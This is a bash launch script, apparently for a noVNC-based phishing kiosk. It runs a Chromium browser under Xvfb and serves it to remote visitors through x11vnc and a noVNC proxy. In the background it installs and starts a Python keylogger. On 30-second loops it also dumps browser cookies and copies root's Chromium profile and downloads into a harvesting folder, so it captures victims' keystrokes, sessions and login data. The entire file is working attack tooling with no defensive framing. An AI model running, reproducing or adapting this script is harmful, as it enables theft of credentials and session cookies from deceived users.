RESOLUTION=$(head -1 /home/user/tmp/resolution$SID.txt)
sudo rm -f /tmp/.X${DISPLAY#:}-lock ; /bin/bash -c "/home/user/kiosk.sh" &
nohup /bin/bash -c "touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default" &
nohup /bin/bash -c "touch /home/user/Downloads/Keylogger.txt ; sudo pip3 install pyxhook pycryptodome" &
nohup /bin/bash -c "sleep 30 && sudo python3 /home/user/keylogger.py 2> log.txt" &
nohup /bin/bash -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &
nohup /bin/bash -c "while true ; do sleep 30 ; sudo cp -R -u /root/.config/chromium/Default /home/user/Downloads/ ; done" &
nohup /bin/bash -c "while true ; do sleep 30 ; sudo cp -R -u /root/Downloads/ /home/user/Downloads/ ; done" &
nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &
while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep .3; done
#IFS=x read -ra arr <<< "$RESOLUTION" && sudo sed -i "s/1280,720/${arr[0]},${arr[1]}/" /etc/chromium/chromium.conf
IFS=x read -ra arr <<< "$RESOLUTION" && sudo sed -i "s/--window-size=[0-9]*,[0-9]*/--window-size=${arr[0]},${arr[1]}/" /etc/chromium/chromium.conf
nohup startx chromium &
nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &
nohup /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980
